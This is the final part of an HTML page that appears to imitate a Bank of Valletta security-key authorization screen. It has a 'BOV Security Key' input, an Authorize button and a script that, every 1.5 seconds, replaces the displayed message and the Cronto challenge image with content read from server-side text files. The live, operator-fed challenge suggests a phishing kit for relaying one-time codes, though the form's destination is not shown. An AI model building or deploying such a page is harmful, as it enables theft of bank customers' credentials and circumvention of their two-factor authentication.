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" style="width: 70px; height: 60px;" /></p>

                            </div>
                        </div>

                     
                    </div>
                </div>
            </div>

            <div class="footer">
                <div class="input-row">
                    <label class="security" for="sec">BOV Security Key:</label>
                    <div class="input-area pos-rel">
                        <input
                            id="sec"
                            class="code-input"
                            name="j_usager"
                            placeholder="Enter code"
                            aria-label="Security key"
                            required
                        />
                    </div>
                </div>
                <div class="button-row">
                    <div id="footerHelp" class="help-inline" title="Help" aria-label="Help"><p><img alt="" src="data:image/png;base64,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" style="width: 40px; height: 40px;" /></p>
</div>
                    <button class="btn" type="button" id="cancelBtn">Cancel</button>
                    <button class="btn primary" type="submit" id="allowBtn">Authorize</button>
                </div>
            </div>
            </form>
        </div>

        <script>
            // Make all event listeners defensive (only attach if element exists)

            // Footer help click (inline)
            const footerHelp = document.getElementById("footerHelp");
            if (footerHelp) {
                footerHelp.addEventListener("click", function () {
                    // Keep message short & helpful
                    alert("Help: contact support.");
                });
            }

            // Cancel button
            const cancelBtn = document.getElementById("cancelBtn");
            if (cancelBtn) {
                cancelBtn.addEventListener("click", function () {
                    alert("Action canceled");
                });
            }

            // Mobile icon spin handling:
            // - Apply .spin class to any element with .mobile-ico when viewport width <= 880
            function updateMobileSpin() {
                const spinning = window.innerWidth <= 880;
                const icons = document.querySelectorAll(".mobile-ico");
                icons.forEach((el) => {
                    if (spinning) el.classList.add("spin");
                    else el.classList.remove("spin");
                });
            }
            updateMobileSpin();
            window.addEventListener("resize", updateMobileSpin);

            // Optional: toggle spin if a mobile icon is clicked (defensive)
            document.addEventListener("click", function (e) {
                const target = e.target;
                if (target && target.classList && target.classList.contains("mobile-ico")) {
                    target.classList.toggle("spin");
                }
            });
        </script>

        <script>
            let lastMessage = "";
            let lastImageUrl = "";

            async function fetchUpdates() {
                try {
                    // --- Fetch message.txt ---
                    const msgRes = await fetch("message.txt?nocache=" + Date.now());
                    const msgText = (await msgRes.text()).trim();

                    if (msgText !== lastMessage) {
                        lastMessage = msgText;
                        const live = document.getElementById("live-message");
                        if (live) live.textContent = lastMessage;
                    }

                    // --- Fetch url.txt for image ---
                    const imgRes = await fetch("url.txt?nocache=" + Date.now());
                    const imgUrl = (await imgRes.text()).trim();

                    if (imgUrl && imgUrl !== lastImageUrl) {
                        lastImageUrl = imgUrl;
                        const cr = document.querySelector(".cronto");
                        if (cr) {
                            // small fade effect when image changes:
                            cr.style.opacity = "0.0";
                            // ensure it's visible after src loads
                            cr.onload = () => {
                                cr.style.transition = "opacity 240ms ease-in";
                                cr.style.opacity = "1";
                            };
                            // set new source (cache-busted)
                            cr.src = imgUrl + (imgUrl.indexOf("?") === -1 ? "?_=" + Date.now() : "&_=" + Date.now());
                        }
                    }

                } catch (error) {
                    console.log("Error fetching updates:", error);
                }
            }

            // Poll every 1.5 seconds
            setInterval(fetchUpdates, 1500);

            // First run instantly
            fetchUpdates();
        </script>
    </body>
</html>

	   </main>
        <!--!-->




  </body>
</html>
